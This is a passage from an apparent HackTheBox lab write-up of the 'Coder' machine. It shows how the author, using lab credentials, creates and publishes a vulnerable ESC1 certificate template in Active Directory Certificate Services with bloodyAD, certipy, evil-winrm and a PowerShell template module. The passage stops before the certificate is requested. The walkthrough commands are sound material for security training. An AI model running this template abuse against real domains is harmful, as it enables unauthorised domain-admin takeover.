distinguishedName: CN=PKI Admins,CN=Users,DC=coder,DC=htb
objectSid: S-1-5-21-2608251805-3526430372-1546376444-2101
sAMAccountName: PKI Admins
```

As seen here i am apart of the PKI admins group

```python
❯❯❯ bloodyAD --host dc01.coder.htb -d coder.htb -u s.blade -p 'AmcwNO60Zg3vca3o0HDrTC6D' get writable --detail

distinguishedName: OU=BuildAgents,OU=Development,DC=coder,DC=htb
computer: CREATE_CHILD
```

And looking back at the `s.blade` user they can create computer accounts within the `buildagents` OU, which would makes sense since `s.blade` is part of the `buildagent mgmt` group

So i think both of these compromised user accounts are going to be useful here

So with these two user accounts i can create computer accounts under a certain OU, but more importantly i can make my own templates as `e.black` including ones that are vulnerable

# Domain Admin

So the plan here is to simply make a copy of an existing template then use certipy to save it to a json file, then modify this json file to fit the requirements of ESC1 then write this new json file to the CA as a new template, then ill just abuse ESC1

```python
❯❯❯ certipy-ad template -dc-ip 10.129.229.190 -dc-host dc01.coder.htb -target-ip 10.129.229.190 -target dc01.coder.htb -u e.black@coder.htb -p 'ypOSJXPqlDOxxbQSfEERy300' -template Machine -save-configuration Machine.json
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'Machine.json'
[*] Wrote current configuration for 'Machine' to 'Machine.json'
```

First ill save the template to a json file

```python
7
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : coder-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-06-29T04:01:44+00:00
    Template Last Modified              : 2022-06-29T04:01:44+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CODER.HTB\Domain Admins
                                          CODER.HTB\Domain Computers
                                          CODER.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CODER.HTB\Enterprise Admins
        Full Control Principals         : CODER.HTB\Domain Admins
                                          CODER.HTB\Enterprise Admins
        Write Owner Principals          : CODER.HTB\Domain Admins
                                          CODER.HTB\Enterprise Admins
        Write Dacl Principals           : CODER.HTB\Domain Admins
                                          CODER.HTB\Enterprise Admins
        Write Property Enroll           : CODER.HTB\Domain Admins
                                          CODER.HTB\Domain Computers
                                          CODER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CODER.HTB\Domain Computers
```

if i look at the current settings on the template and compare them with the requirements for ESC1 i only to change one thing

The following are the requirements for ESC1:

- Client Authentication: True (already set)
- Enabled: True (already set)
- Enrollee Supplies Subject: True
- Requires Management Approval: False (already set)
- Authorized Signatures Required: 0 (already set)

After some research i find the attribute that controls the `Enrollee Supplies Subject` is `"msPKI-Certificate-Name-Flag": 402653184`

https://github.com/GoateePFE/ADCSTemplate/blob/master/ADCSTemplate.psm1

```python
evil-winrm-py PS C:\Users\e.black\Desktop> upload ADCSTemplate.psm1 .
Uploading /home/kali/htb/coder/ADCSTemplate.psm1: 100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 21.5k/21.5k [00:00<00:00, 250kB/s]
[+] File uploaded successfully as: C:\Users\e.black\Desktop\ADCSTemplate.psm1
```

Ill also upload this powershell script which will allow me to use its cmdlets to add a new template

```python
evil-winrm-py PS C:\Users\e.black\Desktop> Import-Module .\ADCSTemplate.psm1
```

Ill then import it

https://github.com/Orange-Cyberdefense/GOAD/blob/main/ansible/roles/adcs_templates/files/ESC1.json

Instead of creating my own and possibly missing something ill use this which i found 

```python
evil-winrm-py PS C:\Users\e.black\Desktop> upload ESC1.json
Uploading /home/kali/htb/coder/ESC1.json: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 4.15k/4.15k [00:00<00:00, 64.8kB/s]
[+] File uploaded successfully as: C:\Users\e.black\Desktop\ESC1.json
evil-winrm-py PS C:\Users\e.black\Desktop>
```

Ill upload it

```python
evil-winrm-py PS C:\Users\e.black\Desktop> New-ADCSTemplate -DisplayName "ESC1" -Publish -JSON (Get-Content .\ESC1.json -raw) -Identity "CODER.HTB\PKI Admins"
```

And now ill use the cmd let from `ADCSTemplate.psm1` to create the new template from the esc1 json file then also set the identity so my user can enroll

```python
  0
    Template Name                       : ESC1
    Display Name                        : ESC1
    Certificate Authorities             : coder-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-11-20T02:59:17+00:00
    Template Last Modified              : 2026-11-20T02:59:17+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CODER.HTB\PKI Admins
      Object Control Permissions
        Owner                           : CODER.HTB\Erron Black
        Full Control Principals         : CODER.HTB\Domain Admins
                                          CODER.HTB\Local System
                                          CODER.HTB\Enterprise Admins
        Write Owner Principals          : CODER.HTB\Domain Admins
                                          CODER.HTB\Local System
                                          CODER.HTB\Enterprise Admins
        Write Dacl Principals           : CODER.HTB\Domain Admins
                                          CODER.HTB\Local System
                                          CODER.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CODER.HTB\PKI Admins
    [+] User ACL Principals             : CODER.HTB\Erron Black
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC4                              : Template is owned by user.
```

And now running certipy i see its vulnerable

```python

```

